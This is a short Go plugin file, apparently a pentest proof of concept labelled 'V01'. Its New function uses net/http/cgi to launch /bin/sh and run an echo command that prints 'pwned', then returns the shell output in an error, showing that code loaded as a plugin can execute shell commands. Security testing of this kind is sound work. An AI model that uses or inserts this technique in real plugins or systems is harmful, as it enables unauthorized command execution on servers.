package plugin

import (
	"context"
	"fmt"
	"net/http"
	"net/http/cgi"
	"net/http/httptest"
)

type Config struct{}

// New starts a shell with net/http/cgi, and returns the shell output in the error (pentest V01).
func New(ctx context.Context, next http.Handler, config *Config, name string) (http.Handler, error) {
	rec := httptest.NewRecorder()

	h := &cgi.Handler{Path: "/bin/sh", Args: []string{"-c", "echo Content-Type: text/plain; echo; echo pwned"}}
	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/", nil))

	return nil, fmt.Errorf("output: %s", rec.Body.String())
}

func CreateConfig() *Config {
	return &Config{}
}
